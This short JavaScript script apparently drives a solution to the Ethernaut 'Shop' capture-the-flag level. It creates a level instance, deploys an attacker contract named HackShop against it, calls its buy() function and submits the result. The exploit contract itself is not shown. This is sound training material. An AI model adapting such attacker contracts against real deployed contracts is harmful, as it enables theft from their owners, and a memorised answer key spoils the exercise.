module.exports = async function({ artifacts, web3, ethernaut }) {
  const HackShop = artifacts.require('HackShop');
  const instanceAddress = await ethernaut.createInstance(web3, 'Shop');

  const hackInstance = await HackShop.new(instanceAddress);
  await hackInstance.buy();

  return ethernaut.submitInstance(web3, instanceAddress);
};